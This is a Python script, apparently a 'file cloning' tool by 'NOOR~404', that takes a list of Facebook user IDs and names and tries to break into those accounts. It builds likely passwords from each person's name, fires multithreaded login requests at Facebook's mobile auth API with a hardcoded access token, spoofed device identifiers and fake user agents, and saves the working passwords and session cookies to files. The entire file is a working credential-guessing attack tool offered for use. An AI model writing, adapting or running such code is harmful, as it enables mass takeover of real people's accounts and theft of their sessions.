#×××××××××××\~MODULES~/×××××××××××#
import os,time,random,sys,string,uuid,json
from os import system
from pip._vendor import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#×××××××××××\~COLOR~/×××××××××××#
G="\033[1;92m"
W="\x1b[38;5;15m"
B="\033[1;34m"
Y="\x1b[38;5;226m"
A="\x1b[38;5;123m"
R="\33[1;91m"
O="\x1b[38;5;81m"
X="\x1b[38;5;205m"
P="\x1b[10;95m"
#×××××××××××\~STYLE~/×××××××××××#
rddf = f"{G}>{W}>{G}>{W}"
rdf = f"{G}<{W}[{G}●{W}]{G}>{W}"
rdff = f"{G}<{W}[{G}?{W}]{G}>{W}"
rdf1 = f"{G}<{W}[{G}1{W}]{G}>{W}"
rdf2 = f"{G}<{W}[{G}2{W}]{G}>{W}"
rdf3 = f"{G}<{W}[{G}3{W}]{G}>{W}"
rdf0 = f"{G}<{W}[{G}0{W}]{G}>{W}"
#×××××××××××\~CLEAR~/×××××××××××#
def __CLEAR__():
	system("clear")
	print(logo)
#×××××××××××\~LINE~/×××××××××××#
def __LINE__():
	print(f"{W}{50*'~'}")
#×××××××××××\~LOGO~/×××××××××××#
logo = f"""
            {G}╔═╗╦╦  ╔═╗  ╔═╗╦╔═╗╔╦╗
            {W}╠╣ ║║  ║╣   ║ ╦║╠╣  ║ 
            {G}╚  ╩╩═╝╚═╝  ╚═╝╩╚   ╩ {W}V{G}/{W}GIFT
{W}{50*'~'}
{rdf} DEVOLOPER {rddf} NOOR{G}~{W}404
{rdf} TOOL      {rddf} FILE{G}~{W}/{G}~{W}CLONE
{W}{50*'~'}"""
#×××××××××××\~SELF~/×××××××××××#
class __FILE_X_NOOR__:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.twf = []
        self.plist = []
        self.coke = []
#×××××××××××\~MAIN~MENU~/×××××××××××#
    def __MENU__(self):
    	__CLEAR__()
    	print(f"{rdf1} FILE CLONING ")
    	print(f"{rdf0} EXIT TOOL ")
    	__LINE__()
    	__MENC__ = input(f"{rdff} CHOICE MENU {rddf} ")
    	if __MENC__ == "1":
    	    self.__FILE__()
    	if __MENC__ == "0":
    	     __LINE__();print(f"{rdf} EXITED SUCCESSFULLY ");time.sleep(1)
    	if __MENC__ not in ["1","0"]:
        	__LINE__();print(f"{rdf} INVALID OPTION TRY AGAIN......!");time.sleep(1);self.__MENU__()
#×××××××××××\~FILE~MENU~/×××××××××××#
    def __FILE__(self):
    	__CLEAR__()
    	print(f"{rdf} EXAMPLE   {rddf}{G} /{W}sdcard{G}/{W}NOOR.txt or NOOR.txt ")
    	__LINE__()
    	__FILEC__ = input(f"{rdff} INPUT FILE {rddf} ")
    	try:
    	    if not __FILEC__.startswith("/") and not __FILEC__.startswith("./"):
    	        __fileXX__ = f"/sdcard/{__FILEC__}"
    	    else:
    	        __fileXX__ = __fileloX__
    	    __fileckX__ = open(__fileXX__,'r').read().splitlines()
    	except FileNotFoundError:
    	    __LINE__();print(f" FILE NOT FOUND TRY AGAIN ");time.sleep(1.2);self.__FILE__()
    	__CLEAR__()
    	print(f"{rdf1} METHOD {G}<{W}[{G}1{W}~{G}B{W}~{G}API{W}]{G}>{W} ")
    	print(f"{rdf2} METHOD {G}<{W}[{G}2{W}~{G}GRAPH{W}]{G}>{W} ")
    	__LINE__()
    	__METHOD__ = input(f"{rdff} INPUT METHOD {rddf} ")
    	__CLEAR__()
    	print(f"{rdf1} AUTO BANGLADESH PASSLIST ")
    	print(f"{rdf2} AUTO INDIA PASSLIST ")
    	print(f"{rdf3} CUSTOM PASSLIST ")
    	__LINE__()
    	__PAS__ = input(f"{rdff} INPUT PASSLIST {rddf} ")
    	if __PAS__ == "1":
    	    self.plist.append("first2025")
    	    self.plist.append("first123")
    	    self.plist.append("first@12345")
    	    self.plist.append("000999")
    	    self.plist.append("@first@")
    	    self.plist.append("firstlast1234")
    	    self.plist.append("first321")
    	    self.plist.append("firstlast")
    	    self.plist.append("first")
    	    self.plist.append("first12")
    	    self.plist.append("firstlast123")
    	    self.plist.append("123412")
    	    self.plist.append("0987654")
    	    self.plist.append("@1234@")
    	    self.plist.append("09876543")
    	    self.plist.append("@@@@####")
    	    self.plist.append("@@@###")
    	    self.plist.append("@123456@")
    	    self.plist.append("@12345678@")
    	    self.plist.append("first4321")
    	if __PAS__ == "2":
    	    self.plist.append('57273200')
    	    self.plist.append('59039200')
    	    self.plist.append('57575751')
    	    self.plist.append('07860786')
    	if __PAS__ not in ["1","2"]:
    	    try:
    	        __CLEAR__()
    	        print(f"{rdf} BANGLADESH PASSLIST 10{G}/{W}15 LIMIT")
    	        print(f"{rdf} OTHERS COUNTRY PASSLIST 5{G}/{W}10 LIMIT")
    	        __LINE__()
    	        __PASS__ = int(input(f"{rdff} PASSLIST LIMIT {rddf} "))
    	    except:
    	        __PASS__ = 5
    	    __CLEAR__()
    	    print(f"{rdf} EXAMPLE  {rddf} firstlast {G}/{W} first12 {G}/{W} first123 ")
    	    __LINE__()
    	    for i in range(__PASS__):
    	        self.plist.append(input(f"{rdff} ENTER PASSLIST {G}<[{W}{i+1}{G}]> {rddf} "))
    	__CLEAR__()
    	print(f"{rdf} DO YOU WANT TO SHOW COOKIE....? ")
    	__LINE__()
    	ckie = input(f"{rdff} Y/N {rddf} ")
    	if ckie in ['y','Y','yes','Yes','1']:
    	    self.coke.append('y')
    	else:
    	    self.coke.append('n')
    	with ThreadPool(max_workers=30) as __FILE__:
    	    __CLEAR__()
    	    total_ids = str(len(__fileckX__))
    	    print(f"{rdf} TOTAL IDS {rddf} {total_ids} ")
    	    print(f"{rdf} IF NO RESULT ON{G}/{W}OFF AIRPLANE MODE......! ")
    	    __LINE__()
    	    for user in __fileckX__:
    	        ids,names = user.split('|')
    	        passlist = self.plist
    	        if __METHOD__ == "1":
    	            __FILE__.submit(self.___M1___,ids,names,passlist)
    	        if __METHOD__ == "2":
    	            __FILE__.submit(self.___M2___,ids,names,passlist)
    	        if __METHOD__ not in ["1","2"]:
    	            __FILE__.submit(self.___M1___,ids,names,passlist)
    	print("\033[1;37m")
    	__LINE__()
    	print(f"{rdf} THE PROCESS HAS COMPLETED...!")
    	print(f"{rdf} TOTAL OK{G}/{W}2F{G}/{W}CP {rddf}{B} "+str(len(self.oks))+f"{G}/{Y}"+str(len(self.twf))+f"{G}/{R}"+str(len(self.cps)))
    	__LINE__()
    	print(f"{rdf} THANKS FOR USING.....! ")
    	sys.exit()
#×××××××××××\~FILE~M1~/×××××××××××#
    def ___M1___(self,ids,names,passlist):
        try:
            global loop,oks,cps
            color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f'\r{rdf}{W}~{G}<{W}[{B}{color}NOOR-F1{W}]{G}>{W}~{G}<{W}[{color}{self.loop}{W}]{G}>{W}~{G}<{W}[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{W}]{G}>{W} ')
            sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data = {
                'adid':adid,
                'format':'json',
                'device_id':device_id,
                'email':ids,
                'password':pas,
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),
                "sim_country": "id",
                "network_country": "id",
                "enroll_misauth": "false",
                'generate_analytics_claims':'1',
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                "cpl": "true",
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'meta_inf_fbmeta':'',
                'currently_logged_in_userid':'0',
                'fb_api_req_friendly_name':'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                headers = {
                'Authorization':f'OAuth {accessToken}',
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-Friendly-Name':'authenticate',
                'X-FB-Connection-Type':'unknown',
                'User-Agent':self.__UPR__(),
                'Accept-Encoding':'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'}
                url = 'https://b-api.facebook.com/method/auth.login'
                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                po = requests.post(url,data=data,headers=headers).json()
                if 'session_key' in po:
                    colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"]) 
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f'\r{rdf}{W}~{G}<{W}[{B}NOOR-OK{W}]{G}>{B} '+ids+f'{W} / {B}'+pas+'\033[1;97m')
                    if 'y' in self.coke:
                        print(f'\r{rdf}{W}~{G}<{W}[{B}COKIE-X{W}]{G}>{colorX} '+coki);__LINE__()
                    open('/sdcard/NOOR-M1-OK.txt','a').write(ids+'/'+pas+'/'+coki+'\n')
                    self.oks.append(ids)
                    break
                if twf in str(po):
                    print(f'\r{rdf}{W}~{G}<{W}[{Y}NOOR-2F{W}]{G}>{Y} '+ids+f'{W} / {Y}'+pas+'\033[1;97m')
                    open('/sdcard/NOOR-M1-2F.txt','a').write(ids+'/'+pas+'\n')
                    self.twf.append(ids)
                    break
                if 'www.facebook.com' in po['error_msg']:
                    print(f'\r{rdf}{W}~{G}<{W}[{R}NOOR-CP{W}]{G}>{R} '+ids+f'{W} / {R}'+pas+'\033[1;97m')
                    open('/sdcard/NOOR-M1-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop+=1
        except Exception as e:
            pass
#×××××××××××\~FILE~M2~/×××××××××××#
    def ___M2___(self,ids,names,passlist):
        try:
            global loop,oks,cps
            color = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
            sys.stdout.write(f'\r{rdf}{W}~{G}<{W}[{B}{color}NOOR-F2{W}]{G}>{W}~{G}<{W}[{color}{self.loop}{W}]{G}>{W}~{G}<{W}[{B}{len(self.oks)}{G}/{Y}{len(self.twf)}{G}/{R}{len(self.cps)}{W}]{G}>{W} ')
            sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                random_seed = random.Random()
                adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                data = {
                'adid':adid,
                'format':'json',
                'device_id':device_id,
                'email':ids,
                'password':pas,
                "session_id": str(uuid.uuid4()),
                "advertiser_id": str(uuid.uuid4()),
                "reg_instance": str(uuid.uuid4()),
                "logged_out_id": str(uuid.uuid4()),
                "hash_id": str(uuid.uuid4()),
                "sim_country": "id",
                "network_country": "id",
                "enroll_misauth": "false",
                'generate_analytics_claims':'1',
                'credentials_type':'password',
                'source':'login',
                'error_detail_type':'button_with_disabled',
                'enroll_misauth':'false',
                "cpl": "true",
                'generate_session_cookies':'1',
                'generate_machine_id':'1',
                'meta_inf_fbmeta':'',
                'currently_logged_in_userid':'0',
                'fb_api_req_friendly_name':'authenticate',
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                headers = {
                'Authorization':f'OAuth {accessToken}',
                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                "X-FB-Net-HNI": str(random.randint(900000, 999999)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                'X-FB-Friendly-Name':'authenticate',
                'X-FB-Connection-Type':'unknown',
                'User-Agent':self.__UPR__(),
                'Accept-Encoding':'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-FB-HTTP-Engine': 'Liger'}
                url = 'https://b-api.facebook.com/method/auth.login'
                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                po = requests.post(url,data=data,headers=headers).json()
                if 'session_key' in po:
                    colorX = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"]) 
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print(f'\r{rdf}{W}~{G}<{W}[{B}NOOR-OK{W}]{G}>{B} '+ids+f'{W} / {B}'+pas+'\033[1;97m')
                    if 'y' in self.coke:
                        print(f'\r{rdf}{W}~{G}<{W}[{B}COOKIE-X{W}]{G}>{colorX} '+coki);__LINE__()
                    open('/sdcard/NOOR-M2-OK.txt','a').write(ids+'/'+pas+'/'+coki+'\n')
                    self.oks.append(ids)
                    break
                if twf in str(po):
                    print(f'\r{rdf}{W}~{G}<{W}[{Y}NOOR-2F{W}]{G}>{Y} '+ids+f'{W} / {Y}'+pas+'\033[1;97m')
                    open('/sdcard/NOOR-M2-2F.txt','a').write(ids+'/'+pas+'\n')
                    self.twf.append(ids)
                    break
                if 'www.facebook.com' in po['error_msg']:
                    print(f'\r{rdf}{W}~{G}<{W}[{R}NOOR-CP{W}]{G}>{R} '+ids+f'{W} / {R}'+pas+'\033[1;97m')
                    open('/sdcard/NOOR-M2-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
            self.loop+=1
        except Exception as e:
            pass
#×××××××××××\~UA~/×××××××××××#
    def __UPR__(self):
    	ua1 = "[FBAN/FB4A;FBAV/339.0.0.32.118;FBBV/323006995;FBDM/{density=2.0,width=720,height=1369};FBLC/en_GB;FBRV/325030047;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    	ua2 = "[FBAN/FB4A;FBAV/309.0.0.3.179;FBBV/482983480;FBDM/{density=3.5,width=1080,height=1491};FBLC/en_GB;FBRV/0;FBCR/TNT;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
    	ua3 = "[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672900;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/0;FBCR/YOTA;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo Z90a40;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    	ua4 = "[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM/{density=3.0,width=1080,height=2224};FBLC/en_GB;FBRV/335247818;FBCR/Tele2You;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STK-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
    	ua5 = "[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265245028;FBDM/{density=3.0,width=1080,height=2090};FBLC/en_GB;FBRV/268119191;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/JNY-LX1;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    	__uaxx__ = random.choice([ua1,ua2,ua3,ua4,ua5])
    	__max__ = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{__uaxx__}'
    	return str(__max__)
#×××××××××××\~LAST~CALL~/×××××××××××#
if __name__ == "__main__":
    system("clear")
    __FILE_X_NOOR__().__MENU__()
#×××××××××××\~END~CALL~/×××××××××××#